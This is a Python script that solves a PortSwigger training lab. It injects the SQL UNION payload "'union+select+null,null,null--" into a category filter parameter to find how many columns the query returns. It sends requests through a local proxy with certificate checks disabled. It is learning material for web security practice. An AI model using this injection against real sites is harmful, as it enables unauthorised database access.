# Lab name: Lab: SQL injection UNION attack, determining the number of columns returned by the query
# Lab link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

req = requests.Session()

proxies = {
    'http':'http://127.0.0.1:8080', 
    'https':'http://127.0.0.1:8080'
}
payload = "'union+select+null,null,null--"

def filter_url():
    global url
    url = (url.split('.net', 1)[0]) + f'.net/filter?category=Lifestyle{payload}'


url = input('Enter lab url: ')

filter_url()


response = req.get(url, proxies=proxies, verify=False)

if 'Congratulations, you solved the lab!' in response.text:
    print('Lab solved successfully')
elif response.status_code == 504:
    print('Lab is not available, please refresh the url')
else:
    print('failed to solve lab, please check you enter valid url')
